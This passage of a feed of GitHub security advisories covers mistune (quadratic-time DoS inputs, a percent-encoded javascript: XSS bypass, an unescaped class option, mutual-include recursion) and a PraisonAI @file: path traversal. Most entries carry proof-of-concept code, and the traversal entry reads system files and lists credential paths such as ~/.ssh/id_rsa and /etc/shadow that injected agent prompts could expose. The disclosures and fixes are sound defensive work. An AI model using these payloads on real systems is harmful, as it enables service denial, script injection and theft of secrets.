<li>Repeating the request floods the worker pool. On a single-thread WSGI handler this is one request per outage; on a thread pool, a small number of concurrent attackers exhausts capacity.</li>
</ol>
<h2 id="security-impact">Security Impact</h2>
<p><strong>Severity:</strong> sec-high. Network-reachable, no authentication, predictable scaling, single-payload primitive. Only requires a user-supplied markdown sink and a formatting plugin enabled — both are common.
<strong>Attacker capability:</strong> small input → large CPU. Doubling input size quadruples CPU time. Sustained requests deny service to other users.
<strong>Preconditions:</strong> application uses mistune with any of <code>strikethrough</code>, <code>mark</code>, or <code>insert</code> plugins enabled. Default config does NOT enable these (so the attack only fires against the substantial deployed population that turns them on for GFM/markdown-extra compatibility).
<strong>Differential:</strong> PoC-verified against <a href="mailto:mistune@3.2.1">mistune@3.2.1</a>:</p>
<pre><code class="language-python">import mistune, time
md = mistune.create_markdown(plugins=['strikethrough'])
for n in [500, 1000, 2000, 4000, 8000]:
    s = '~~x~~' * n
    t = time.time()
    md(s)
    print(f'  ~~x~~ * {n} ({len(s)}b): {(time.time() - t) * 1000:.0f}ms')

# Output (Python 3.13, Linux, 2.5GHz CPU):
#   ~~x~~ *  500  (2500b):    19ms
#   ~~x~~ * 1000  (5000b):    71ms
#   ~~x~~ * 2000 (10000b):   272ms
#   ~~x~~ * 4000 (20000b):  1090ms
#   ~~x~~ * 8000 (40000b):  4302ms

# Identical scaling for `==x==` (mark) and `^^x^^` (insert):
md = mistune.create_markdown(plugins=['mark'])
md('==x==' * 4000)   # ~1100ms
md = mistune.create_markdown(plugins=['insert'])
md('^^x^^' * 4000)   # ~1080ms

# Without the plugin, the same input parses in linear time:
md = mistune.create_markdown()  # no plugins
md('~~x~~' * 4000)               # 4ms (1000x faster)
</code></pre>
<p>The patched build (with the suggested fix below — either a delimiter-stack rewrite or a hard cap on the number of unmatched markers tracked) keeps the time linear in N.</p>
<h2 id="suggested-fix">Suggested Fix</h2>
<p>The minimal fix is to cap the number of simultaneously-tracked unmatched markers, treating extras as literal text. The proper fix is a single-pass delimiter-stack algorithm matching the CommonMark reference implementation. Surgical patch:</p>
<pre><code class="language-diff">--- a/src/mistune/plugins/formatting.py
+++ b/src/mistune/plugins/formatting.py
@@ ... in the parse_strikethrough / parse_mark / parse_insert functions
+    # Bound the number of open markers the parser will track concurrently.
+    # Inputs with more than this many open ~~ / == / ^^ in flight are
+    # almost certainly adversarial; CommonMark gives no semantics to
+    # deeply nested unmatched markers.
+    MAX_OPEN_MARKERS = 100
+    if open_marker_count &gt; MAX_OPEN_MARKERS:
+        # treat remaining markers as literal text, do not invoke the
+        # forward-scan to find a close
+        ...
</code></pre>
<p>A regression test should assert that <code>md('~~x~~' * 50_000)</code> completes in under 1 second. The same fix shape applies to <code>_MARK_END</code> and <code>_INSERT_END</code>.</p>
<h3 id="references">References</h3>
<ul>
<li><a href="https://github.com/lepture/mistune/security/advisories/GHSA-c8j7-8cv4-2xmq">https://github.com/lepture/mistune/security/advisories/GHSA-c8j7-8cv4-2xmq</a></li>
<li><a href="https://nvd.nist.gov/vuln/detail/CVE-2026-59922">https://nvd.nist.gov/vuln/detail/CVE-2026-59922</a></li>
<li><a href="https://github.com/lepture/mistune/commit/96d0f57f8fe9eeb06bb4cff521962a27d7c402e7">https://github.com/lepture/mistune/commit/96d0f57f8fe9eeb06bb4cff521962a27d7c402e7</a></li>
<li><a href="https://github.com/lepture/mistune/releases/tag/v3.3.0">https://github.com/lepture/mistune/releases/tag/v3.3.0</a></li>
<li><a href="https://github.com/pypa/advisory-database/tree/main/vulns/mistune/PYSEC-2026-2210.yaml">https://github.com/pypa/advisory-database/tree/main/vulns/mistune/PYSEC-2026-2210.yaml</a></li>
<li><a href="https://github.com/advisories/GHSA-c8j7-8cv4-2xmq">https://github.com/advisories/GHSA-c8j7-8cv4-2xmq</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-c8j7-8cv4-2xmq</uri>
        </author>
        <category label="severity" term="HIGH"/>
        <published>2026-07-20T21:34:37.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[mistune] Mistune: XSS via unescaped class option in Admonition directive]]></title>
        <id>https://github.com/advisories/GHSA-g97x-gvcm-x72h</id>
        <link href="https://github.com/advisories/GHSA-g97x-gvcm-x72h"/>
        <updated>2026-07-20T21:34:18.000Z</updated>
        <content type="html"><![CDATA[<p>In <code>src/mistune/directives/admonition.py</code>, the <code>render_admonition()</code> function concatenates the <code>:class:</code> option directly into the HTML class attribute without escaping (lines 63-68).</p>
<p>This allows attribute injection and XSS even when <code>HTMLRenderer(escape=True)</code> is used.</p>
<p>The directive name parameter is safe (validated against whitelist), but the class option comes from raw user input.</p>
<h3 id="references">References</h3>
<ul>
<li><a href="https://github.com/lepture/mistune/security/advisories/GHSA-g97x-gvcm-x72h">https://github.com/lepture/mistune/security/advisories/GHSA-g97x-gvcm-x72h</a></li>
<li><a href="https://nvd.nist.gov/vuln/detail/CVE-2026-59926">https://nvd.nist.gov/vuln/detail/CVE-2026-59926</a></li>
<li><a href="https://github.com/lepture/mistune/commit/a3cb6e5655308797e8be021d6c7b5bab13cbace2">https://github.com/lepture/mistune/commit/a3cb6e5655308797e8be021d6c7b5bab13cbace2</a></li>
<li><a href="https://github.com/lepture/mistune/releases/tag/v3.2.1">https://github.com/lepture/mistune/releases/tag/v3.2.1</a></li>
<li><a href="https://github.com/pypa/advisory-database/tree/main/vulns/mistune/PYSEC-2026-2214.yaml">https://github.com/pypa/advisory-database/tree/main/vulns/mistune/PYSEC-2026-2214.yaml</a></li>
<li><a href="https://github.com/advisories/GHSA-g97x-gvcm-x72h">https://github.com/advisories/GHSA-g97x-gvcm-x72h</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-g97x-gvcm-x72h</uri>
        </author>
        <category label="severity" term="MODERATE"/>
        <published>2026-07-20T21:34:14.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[mistune] Mistune: XSS via percent-encoded javascript URI bypass in safe_url()]]></title>
        <id>https://github.com/advisories/GHSA-8c25-4j27-2rv3</id>
        <link href="https://github.com/advisories/GHSA-8c25-4j27-2rv3"/>
        <updated>2026-07-20T21:32:52.000Z</updated>
        <content type="html"><![CDATA[<h3 id="summary">Summary</h3>
<p>An XSS vulnerability in Mistune allows bypassing of safe_url() protections via percent-encoded javascript URIs.</p>
<h3 id="details">Details</h3>
<p>The vulnerability exists in HTMLRenderer.safe_url() in Mistune.</p>
<p>The function is intended to block harmful URL schemes such as "javascript:" by checking the prefix of the provided URL:</p>
<pre><code>_url = url.lower()
if _url.startswith(self.HARMFUL_PROTOCOLS):
    return "#harmful-link"
</code></pre>
<p>However, the input URL is not URL-decoded before this check. Because of this, an attacker can use percent-encoding to bypass the filter. For example:</p>
<pre><code>javascript%3Aalert(1)
</code></pre>
<p>Since "%3A" is not decoded to ":", the check does not detect the "javascript:" scheme.</p>
<p>When rendered in a browser, the URL is decoded, resulting in execution of arbitrary JavaScript upon user interaction.</p>
<p>This effectively bypasses Mistune's built-in safe_url() protection mechanism.</p>
<h3 id="poc">PoC</h3>
<ol>
<li><p>Install vulnerable version:</p>
<p> pip install mistune==3.2.0</p>
</li>
<li><p>Run the following code:</p>
<p> import mistune</p>
<p> markdown = mistune.create_markdown()
 html = markdown("<a href="javascript%3Aalert(1)">j</a>")</p>
<p> print(html)</p>
</li>
<li><p>Output:</p>
 <p><a href="javascript%3Aalert(1)">j</a></p>
</li>
<li><p>Open the rendered HTML in a browser and click the link.</p>
</li>
<li><p>The browser decodes "%3A" into ":" and executes:</p>
<p> javascript:alert(1)</p>
</li>
</ol>
<h3 id="impact">Impact</h3>
<p>This is a cross-site scripting (XSS) vulnerability.</p>
<p>An attacker can craft a malicious Markdown link that executes JavaScript in the victim's browser when clicked.</p>
<p>Impact includes:</p>
<ul>
<li>Session hijacking (e.g., cookie theft)</li>
<li>Execution of arbitrary JavaScript in the victim's context</li>
<li>Potential account takeover depending on the application</li>
</ul>
<p>This affects any application that renders user-controlled Markdown using Mistune without additional URL sanitization.</p>
<h3 id="references">References</h3>
<ul>
<li><a href="https://github.com/lepture/mistune/security/advisories/GHSA-8c25-4j27-2rv3">https://github.com/lepture/mistune/security/advisories/GHSA-8c25-4j27-2rv3</a></li>
<li><a href="https://nvd.nist.gov/vuln/detail/CVE-2026-59923">https://nvd.nist.gov/vuln/detail/CVE-2026-59923</a></li>
<li><a href="https://github.com/lepture/mistune/commit/c7101fcbb6e8790e8e39157c5ca2238fc6dd6cbc">https://github.com/lepture/mistune/commit/c7101fcbb6e8790e8e39157c5ca2238fc6dd6cbc</a></li>
<li><a href="https://github.com/lepture/mistune/releases/tag/v3.3.0">https://github.com/lepture/mistune/releases/tag/v3.3.0</a></li>
<li><a href="https://github.com/pypa/advisory-database/tree/main/vulns/mistune/PYSEC-2026-2211.yaml">https://github.com/pypa/advisory-database/tree/main/vulns/mistune/PYSEC-2026-2211.yaml</a></li>
<li><a href="https://github.com/advisories/GHSA-8c25-4j27-2rv3">https://github.com/advisories/GHSA-8c25-4j27-2rv3</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-8c25-4j27-2rv3</uri>
        </author>
        <category label="severity" term="MODERATE"/>
        <published>2026-07-20T21:32:49.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[mistune] Mistune inline_parser: quadratic-time parsing on long runs of `**x**` and `***x***` emphasis pairs]]></title>
        <id>https://github.com/advisories/GHSA-4j32-57v6-6g45</id>
        <link href="https://github.com/advisories/GHSA-4j32-57v6-6g45"/>
        <updated>2026-07-20T21:32:42.000Z</updated>
        <content type="html"><![CDATA[<h2 id="summary">Summary</h2>
<p><strong>Type:</strong> Algorithmic-complexity DoS in core emphasis parsing. A long sequence of well-formed <code>**x**</code> (strong) or <code>***x***</code> (strong-emphasis combined) pairs causes O(N²) parser work. Distinct from the bracket-bomb DoS (<code>[</code> repetition) and from the formatting-plugin DoS (<code>~~</code>/<code>==</code>/<code>^^</code>); this one fires on default-config mistune with no plugins required.
<strong>File:</strong> <code>src/mistune/inline_parser.py</code> lines 41-48 (the <code>EMPHASIS_END_RE</code> family) and the surrounding emphasis dispatch.
<strong>Root cause:</strong> for every opening run of <code>*</code>s the parser scans forward using one of <code>EMPHASIS_END_RE['*']</code> / <code>['**']</code> / <code>['***']</code> to find the matching close. Each scan is bounded per call, but the parser invokes the scan from every potential start position. For input shaped <code>**x**</code> repeated N times, every <code>**</code> is treated as a potential start, each scan can cover up to the end of input. Total work is O(N²). The triple-emphasis variant <code>***x***</code> is slightly worse due to the extra alternation between <code>*</code>, <code>**</code>, and <code>***</code> close patterns. Reproducible against default mistune with no plugins.</p>
<h2 id="affected-code">Affected Code</h2>
<p><strong>File:</strong> <code>src/mistune/inline_parser.py</code>, lines 41-48.</p>
<pre><code class="language-python">EMPHASIS_END_RE = {
    "*": re.compile(r"(?:" + PREVENT_BACKSLASH + r"\\\*|[^\s*])\*(?!\*)"),
    "_": re.compile(r"(?:" + PREVENT_BACKSLASH + r"\\_|[^\s_])_(?!_)\b"),
    "**": re.compile(r"(?:" + PREVENT_BACKSLASH + r"\\\*|[^\s*])\*\*(?!\*)"),
    "__": re.compile(r"(?:" + PREVENT_BACKSLASH + r"\\_|[^\s_])__(?!_)\b"),
    "***": re.compile(r"(?:" + PREVENT_BACKSLASH + r"\\\*|[^\s*])\*\*\*(?!\*)"),
    "___": re.compile(r"(?:" + PREVENT_BACKSLASH + r"\\_|[^\s_])___(?!_)\b"),
}
# Each of the six end-patterns is invoked from every emphasis open position
# fired by the inline rule `r"\*{1,3}(?=[^\s*])|\b_{1,3}(?=[^\s_])"`. The
# scan itself is bounded per call; the cost comes from the parser invoking
# the scan at every matching open marker, giving O(N²) total work.
</code></pre>
<p><strong>Why it's wrong:</strong> same shape as the formatting-plugin and bracket-bomb DoS findings. The CommonMark reference parser handles emphasis in linear time using a delimiter-stack algorithm (<code>commonmark.js</code>, <code>commonmark-py</code>, <code>markdown-it-py</code> all do this). mistune retries the close-scan from each open marker. The bounded regex is not enough; the surrounding loop is the source of the quadratic.</p>
<h2 id="exploit-chain">Exploit Chain</h2>
<ol>
<li>Application uses mistune to render user-supplied markdown. No plugins required — affects the default <code>mistune.create_markdown()</code> configuration.</li>
<li>Attacker submits a 40 KB payload of <code>**x**</code> repeated 8000 times.</li>
<li>Server CPU pegs for ~4 seconds; 16 KB → ~17 seconds. Doubling input quadruples time.</li>
<li>Repeating the request floods the worker pool.</li>
</ol>
<h2 id="security-impact">Security Impact</h2>
<p><strong>Severity:</strong> sec-high. Network-reachable, no authentication, no plugin requirement. Default mistune is vulnerable.
<strong>Attacker capability:</strong> O(N²) CPU cost from a single small input. Predictable scaling, easy to combine with concurrent requests for service denial.
<strong>Preconditions:</strong> application uses <code>mistune.create_markdown()</code> (default config) on attacker-supplied markdown. No plugins required.
<strong>Differential:</strong> PoC-verified against <a href="mailto:mistune@3.2.1">mistune@3.2.1</a>, default config:</p>
<pre><code class="language-python">import mistune, time
md = mistune.create_markdown()                     # no plugins
for n in [500, 1000, 2000, 4000, 8000]:
    s = '**x**' * n
    t = time.time()
    md(s)
    print(f'  **x** * {n} ({len(s)}b): {(time.time() - t) * 1000:.0f}ms')

# Output (Python 3.13, Linux, 2.5GHz CPU):
#   **x** *  500  (2500b):    20ms
#   **x** * 1000  (5000b):    74ms
#   **x** * 2000 (10000b):   284ms
#   **x** * 4000 (20000b):  1079ms
#   **x** * 8000 (40000b):  4309ms

# Triple-emphasis is similar:
md('***x***' * 4000)   # ~1500ms

# Linear in N for non-emphasis input of comparable size:
md('xxxxx' * 8000)     # 1ms (4000x faster)
</code></pre>
<p>The patched build (with the suggested fix below — delimiter-stack rewrite or hard cap on simultaneous open markers) keeps the time linear in N.</p>
<h2 id="suggested-fix">Suggested Fix</h2>
<p>Cap the number of unmatched opening emphasis markers the parser will track simultaneously, treating the rest as literal text:</p>
<pre><code class="language-diff">--- a/src/mistune/inline_parser.py
+++ b/src/mistune/inline_parser.py
@@ ... in the emphasis-handling code path
+    # Bound the number of open emphasis markers tracked. CommonMark gives
+    # no semantics to deeply nested unmatched emphasis; this cap turns the
+    # parser-level O(N^2) into O(N) for adversarial inputs while preserving
+    # behaviour on every realistic markdown document.
+    MAX_OPEN_EMPHASIS = 100
+    if open_emphasis_count &gt; MAX_OPEN_EMPHASIS:
+        # treat remaining * / _ as literal text
+        ...
</code></pre>
<p>The proper fix is a delimiter-stack pass, the same approach the formatting-plugin advisory and the bracket-bomb advisory recommend. All three DoS findings share the same algorithmic pattern; a single rewrite of the inline-token retry loop closes them together. Add a regression test asserting that <code>md('**x**' * 50_000)</code> completes in under 1 second.</p>
<h3 id="references">References</h3>
<ul>
<li><a href="https://github.com/lepture/mistune/security/advisories/GHSA-4j32-57v6-6g45">https://github.com/lepture/mistune/security/advisories/GHSA-4j32-57v6-6g45</a></li>
<li><a href="https://nvd.nist.gov/vuln/detail/CVE-2026-59925">https://nvd.nist.gov/vuln/detail/CVE-2026-59925</a></li>
<li><a href="https://github.com/lepture/mistune/commit/5de41fb8e527004dbc363e047a3c380c9288c74f">https://github.com/lepture/mistune/commit/5de41fb8e527004dbc363e047a3c380c9288c74f</a></li>
<li><a href="https://github.com/lepture/mistune/releases/tag/v3.3.0">https://github.com/lepture/mistune/releases/tag/v3.3.0</a></li>
<li><a href="https://github.com/pypa/advisory-database/tree/main/vulns/mistune/PYSEC-2026-2213.yaml">https://github.com/pypa/advisory-database/tree/main/vulns/mistune/PYSEC-2026-2213.yaml</a></li>
<li><a href="https://github.com/advisories/GHSA-4j32-57v6-6g45">https://github.com/advisories/GHSA-4j32-57v6-6g45</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-4j32-57v6-6g45</uri>
        </author>
        <category label="severity" term="HIGH"/>
        <published>2026-07-20T21:32:40.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[praisonaiagents] PraisonAI: Arbitrary File Read via `@file:` Mention Path Traversal]]></title>
        <id>https://github.com/advisories/GHSA-2rcg-mm5h-xchx</id>
        <link href="https://github.com/advisories/GHSA-2rcg-mm5h-xchx"/>
        <updated>2026-07-20T21:26:30.000Z</updated>
        <content type="html"><![CDATA[<h2 id="summary">Summary</h2>
<p>The MentionsParser in <code>src/praisonai-agents/praisonaiagents/tools/mentions.py</code> processes <code>@file:</code> mentions in agent prompts by reading arbitrary files from the filesystem. When a file path is not found relative to the workspace, the parser falls back to using the path as an absolute path without any validation or boundary check. This allows an attacker who can influence agent prompts (via chat messages, Telegram/Discord/Slack bot inputs, or YAML workflow configs) to read any file on the filesystem accessible to the process user.</p>
<h2 id="details">Details</h2>
<p><strong>Vulnerable code (lines 165–178):</strong></p>
<pre><code class="language-python">def _process_file_mention(self, file_path: str) -&gt; Optional[str]:
    """Process @file:path mention."""
    try:
        # Resolve path relative to workspace
        full_path = self.workspace_path / file_path
        if not full_path.exists():
            # Try as absolute path
            full_path = Path(file_path)
        
        if not full_path.exists():
            self._log(f"File not found: {file_path}", logging.WARNING)
            return f"# File: {file_path}\n[File not found]"
        
        content = full_path.read_text(encoding="utf-8")
</code></pre>
<p><strong>The vulnerability is in the fallback at line 171–172:</strong> When the file is not found relative to <code>workspace_path</code>, the code constructs <code>full_path = Path(file_path)</code>, which accepts any absolute or relative path without validation. There is no:</p>
<ul>
<li><code>..</code> path traversal check</li>
<li>Workspace boundary validation</li>
<li>Symlink resolution against workspace</li>
<li>Protected path guard</li>
</ul>
<p>The <code>file_path</code> parameter originates from parsing <code>@file:</code> mentions in user/LLM prompts. The <code>MentionsParser</code> is used across the framework to process mentions in agent instructions and user messages.</p>
<p><strong>Contrast with <code>skill_tools.py</code> <code>read_skill_file</code></strong> (lines 140–193), which properly validates:</p>
<pre><code class="language-python"># skill_tools.py line 179 — proper validation
if os.path.commonpath([full_path, skill_path]) != skill_path:
    return f"Error: Path traversal detected - {file_path} is outside skill directory"
</code></pre>
<h2 id="poc">PoC</h2>
<p><strong>Setup:</strong> Clean checkout at commit <code>d5f1114a</code>.</p>
<p><strong>Positive trigger — arbitrary file read via @file: mention:</strong></p>
<pre><code class="language-python">import sys
sys.path.insert(0, 'src/praisonai-agents')
from praisonaiagents.tools.mentions import MentionsParser

parser = MentionsParser()

# Test 1: Absolute path read (bypasses workspace resolution)
result = parser._process_file_mention('/etc/hostname')
print(f'Absolute path read: {result[:80]}...')

# Test 2: Relative path with traversal
result = parser._process_file_mention('../../../etc/hostname')
print(f'Traversal read: {result[:80]}...')
</code></pre>
<p><strong>Expected output:</strong></p>
<pre><code>Absolute path read: # File: /etc/hostname
```linux
&lt;hostname&gt;
```...
Traversal read: # File: ../../../etc/hostname
```linux
&lt;hostname&gt;
```...
</code></pre>
<p><strong>Negative control — non-existent file:</strong></p>
<pre><code class="language-python">result = parser._process_file_mention('/nonexistent/secret.txt')
# Returns: "# File: /nonexistent/secret.txt\n[File not found]"
</code></pre>
<p><strong>Cleanup:</strong> No persistence or side effects — read-only operation.</p>
<h2 id="impact">Impact</h2>
<p>An attacker who can inject <code>@file:</code> mentions into agent prompts (via chat messages in Telegram/Discord/Slack bots, user input in web UI, or YAML workflow configurations) can read any file accessible to the process user, including:</p>
<ul>
<li><strong>Secrets and credentials:</strong> <code>.env</code> files, <code>~/.aws/credentials</code>, <code>~/.ssh/id_rsa</code>, API keys</li>
<li><strong>Configuration files:</strong> Database passwords, JWT secrets, OAuth tokens</li>
<li><strong>Source code:</strong> Application internals, database schemas</li>
<li><strong>System files:</strong> <code>/etc/passwd</code>, <code>/etc/shadow</code> (if process has read access)</li>
</ul>
<p>This is particularly dangerous in bot deployments where <code>auto_approve_tools</code> defaults to <code>True</code> and untrusted users can send messages containing <code>@file:</code> mentions.</p>
<h2 id="suggested-remediation">Suggested remediation</h2>
<ol>
<li><strong>Remove the absolute path fallback.</strong> Only resolve files within <code>workspace_path</code>:</li>
</ol>
<pre><code class="language-python">def _process_file_mention(self, file_path: str) -&gt; Optional[str]:
    full_path = (self.workspace_path / file_path).resolve()
    # Ensure resolved path is within workspace
    if not str(full_path).startswith(str(self.workspace_path.resolve())):
        return f"# File: {file_path}\n[Access denied: path outside workspace]"
    if not full_path.exists():
        return f"# File: {file_path}\n[File not found]"
    content = full_path.read_text(encoding="utf-8")
</code></pre>
<ol start="2">
<li><p>Add symlink resolution via <code>.resolve()</code> to prevent symlink-based traversal.</p>
</li>
<li><p>Add a protected path guard (<code>.env</code>, <code>.git</code>, <code>.ssh</code>, keys, credentials).</p>
</li>
<li><p>Apply the same <code>os.path.commonpath</code> pattern used by <code>skill_tools.py</code>.</p>
</li>
</ol>
<h3 id="credits">Credits</h3>
<ul>
<li>Thai Son Dinh from VinSOC Labs (R&amp;D)</li>
</ul>
<h3 id="references">References</h3>
<ul>
<li><a href="https://github.com/MervinPraison/PraisonAI/security/advisories/GHSA-2rcg-mm5h-xchx">https://github.com/MervinPraison/PraisonAI/security/advisories/GHSA-2rcg-mm5h-xchx</a></li>
<li><a href="https://github.com/advisories/GHSA-2rcg-mm5h-xchx">https://github.com/advisories/GHSA-2rcg-mm5h-xchx</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-2rcg-mm5h-xchx</uri>
        </author>
        <category label="severity" term="HIGH"/>
        <published>2026-06-18T13:57:00.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[mistune] Mistune directives/include: mutual `.. include::` recursion crashes the renderer with `RecursionError`, denial of service via two attacker-controlled markdown files]]></title>
        <id>https://github.com/advisories/GHSA-8mpj-m6qm-5qr8</id>
        <link href="https://github.com/advisories/GHSA-8mpj-m6qm-5qr8"/>
        <updated>2026-07-20T21:24:43.000Z</updated>
        <content type="html"><![CDATA[<h2 id="summary">Summary</h2>
<p><strong>Type:</strong> Uncontrolled recursion via mutual include. The <code>Include</code> directive checks for direct self-reference (<code>a.md</code> cannot include <code>a.md</code>), but does not detect indirect cycles. Two markdown files that include each other (<code>a.md</code> → includes <code>b.md</code> → includes <code>a.md</code>) cause unbounded recursion until Python's stack limit fires <code>RecursionError</code>. The exception propagates out of the renderer and crashes the calling code.
<strong>File:</strong> <code>src/mistune/directives/include.py</code>, lines 33-37 (the self-include check is the only cycle-detection logic).
<strong>Root cause:</strong> the include logic only compares <code>os.path.abspath(dest) == os.path.abspath(source_file)</code>. There is no per-render set of "files already included" that would catch transitive cycles. When <code>a.md</code> includes <code>b.md</code>, the recursive <code>block.parse(new_state)</code> call uses <code>dest</code> (b.md) as the new <code>__file__</code>, which then includes <code>a.md</code> (passing the self-check, because the immediate parent file is <code>b.md</code>, not <code>a.md</code>), which then includes <code>b.md</code>, and so on. Each recursion level adds Python frames; the default stack limit of 1000 frames trips after ~7-10 cycle iterations and Python raises <code>RecursionError</code>. Since the directive does not catch the exception, it propagates out of <code>Markdown.parse()</code> and surfaces in the calling code, crashing the request.</p>
<h2 id="affected-code">Affected Code</h2>
<p><strong>File:</strong> <code>src/mistune/directives/include.py</code>, lines 28-54.</p>
<pre><code class="language-python">relpath = self.parse_title(m)
dest = os.path.join(os.path.dirname(source_file), relpath)
dest = os.path.normpath(dest)

if os.path.abspath(dest) == os.path.abspath(source_file):       # &lt;-- only catches direct self-include
    return {"type": "block_error", "raw": "Could not include self: " + relpath}

if not os.path.isfile(dest):
    return {"type": "block_error", "raw": "Could not find file: " + relpath}

with open(dest, "rb") as f:
    content = f.read().decode(encoding)

ext = os.path.splitext(relpath)[1]
if ext in {".md", ".markdown", ".mkd"}:
    new_state = block.state_cls()
    new_state.env["__file__"] = dest
    new_state.process(content)
    block.parse(new_state)                                       # &lt;-- recursive parse, no cycle tracking
    return new_state.tokens
</code></pre>
<p><strong>Why it's wrong:</strong> the cycle-detection check is one level deep. Multi-file cycles slip through trivially. Python's default recursion limit is 1000 frames, so a cycle of length 2 trips after a few hundred mutual includes; the exception is uncaught by the directive, propagating out of <code>Markdown.__call__()</code> and crashing whatever called it.</p>
<h2 id="exploit-chain">Exploit Chain</h2>
<ol>
<li>Application uses mistune with the <code>Include</code> directive enabled. Application accepts user-supplied markdown files (CMS, wiki, multi-user documentation platform, note-taking app, CI/CD doc renderer).</li>
<li>Attacker uploads two markdown files:<ul>
<li><code>a.md</code>: <code>.. include:: b.md</code></li>
<li><code>b.md</code>: <code>.. include:: a.md</code></li>
</ul>
</li>
<li>Renderer is invoked on <code>a.md</code> (or any markdown that references this pair). <code>Include</code> directive includes <code>b.md</code>, which includes <code>a.md</code>, which includes <code>b.md</code>, ... Each recursion adds Python frames.</li>
<li>After ~340 cycle iterations (depending on default <code>sys.setrecursionlimit(1000)</code> and the per-include frame depth), Python raises <code>RecursionError: maximum recursion depth exceeded</code>.</li>
<li>The exception is not caught by the directive. It propagates through <code>block.parse</code>, through <code>Markdown.__call__</code>, and into the application's request handler. If the application doesn't catch it explicitly, the request errors out (HTTP 500 in web contexts, crash in CLI tools).</li>
</ol>
<h2 id="security-impact">Security Impact</h2>
<p><strong>Attacker capability:</strong> crash the rendering engine on demand by submitting any markdown that triggers the cycle. Repeated requests deny service. If the renderer is used in a hot path (per-page-view docs rendering, search-index regeneration, scheduled doc-export jobs), the cycle persists across the whole pipeline.
<strong>Preconditions:</strong> application uses mistune with the <code>Include</code> directive enabled and renders user-supplied markdown that can reference other user-uploaded files. Attacker needs write access to two .md files in the include search path (or a single file including a known-recurring pair).
<strong>Differential:</strong> PoC-verified against <a href="mailto:mistune@3.2.1">mistune@3.2.1</a>:</p>
<pre><code class="language-python">import os, mistune
from mistune.directives import RSTDirective, Include

os.makedirs('/tmp/mistune-recur', exist_ok=True)
with open('/tmp/mistune-recur/a.md', 'w') as f:
    f.write('A\n\n.. include:: b.md')
with open('/tmp/mistune-recur/b.md', 'w') as f:
    f.write('B\n\n.. include:: a.md')

md = mistune.create_markdown(plugins=[RSTDirective([Include()])])
state = md.block.state_cls()
state.env['__file__'] = '/tmp/mistune-recur/a.md'
md.parse('.. include:: b.md', state=state)
# RecursionError: maximum recursion depth exceeded
</code></pre>
<p>The patched build (with the suggested fix below) returns a <code>block_error</code> token like the existing self-include check, instead of recursing forever.</p>
<h2 id="suggested-fix">Suggested Fix</h2>
<p>Track included paths in <code>state.env</code> and reject any include that would re-enter a path already on the include stack:</p>
<pre><code class="language-diff">--- a/src/mistune/directives/include.py
+++ b/src/mistune/directives/include.py
@@ -28,8 +28,18 @@ class Include(DirectivePlugin):
         relpath = self.parse_title(m)
-        dest = os.path.join(os.path.dirname(source_file), relpath)
-        dest = os.path.normpath(dest)
+        base = os.path.realpath(os.path.dirname(source_file))
+        dest = os.path.realpath(os.path.join(base, relpath))
+
+        # Track include stack across recursive parses to detect cycles.
+        include_stack = state.env.setdefault("__include_stack__", [])
+        if dest in include_stack or dest == os.path.realpath(source_file):
+            return {
+                "type": "block_error",
+                "raw": "Could not include (cycle): " + relpath,
+            }

-        if os.path.abspath(dest) == os.path.abspath(source_file):
-            return {
-                "type": "block_error",
-                "raw": "Could not include self: " + relpath,
-            }
@@ ... in the markdown-include branch ...
+        include_stack.append(dest)
+        try:
+            new_state = block.state_cls()
+            new_state.env["__file__"] = dest
+            new_state.env["__include_stack__"] = include_stack
+            new_state.process(content)
+            block.parse(new_state)
+            return new_state.tokens
+        finally:
+            include_stack.pop()
</code></pre>
<p>This catches cycles of any length (<code>a → b → a</code>, <code>a → b → c → a</code>, etc.). Pair this with the path-containment fix from the LFI advisory and the HTML-extension fix from the include-XSS advisory; together those three patches make the <code>Include</code> directive safe to enable on user-supplied markdown.</p>
<p>Add a regression test asserting that a 2-cycle and a 3-cycle both produce <code>block_error</code> rather than <code>RecursionError</code>.</p>
<h3 id="references">References</h3>
<ul>
<li><a href="https://github.com/lepture/mistune/security/advisories/GHSA-8mpj-m6qm-5qr8">https://github.com/lepture/mistune/security/advisories/GHSA-8mpj-m6qm-5qr8</a></li>
<li><a href="https://nvd.nist.gov/vuln/detail/CVE-2026-59927">https://nvd.nist.gov/vuln/detail/CVE-2026-59927</a></li>
<li><a href="https://github.com/lepture/mistune/commit/1bef343ade163fc3bb95572b15be720084cdb993">https://github.com/lepture/mistune/commit/1bef343ade163fc3bb95572b15be720084cdb993</a></li>
<li><a href="https://github.com/lepture/mistune/releases/tag/v3.3.0">https://github.com/lepture/mistune/releases/tag/v3.3.0</a></li>
<li><a href="https://github.com/pypa/advisory-database/tree/main/vulns/mistune/PYSEC-2026-2215.yaml">https://github.com/pypa/advisory-database/tree/main/vulns/mistune/PYSEC-2026-2215.yaml</a></li>
<li><a href="https://github.com/advisories/GHSA-8mpj-m6qm-5qr8">https://github.com/advisories/GHSA-8mpj-m6qm-5qr8</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-8mpj-m6qm-5qr8</uri>
        </author>
        <category label="severity" term="MODERATE"/>
        <published>2026-07-20T21:24:42.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[mistune] Mistune block_parser: quadratic-time parsing on long lists of repeated reference-link definitions]]></title>
        <id>https://github.com/advisories/GHSA-ffq3-xpv3-j92q</id>
        <link href="https://github.com/advisories/GHSA-ffq3-xpv3-j92q"/>
        <updated>2026-07-20T21:24:20.000Z</updated>
        <content type="html"><![CDATA[<h2 id="summary">Summary</h2>
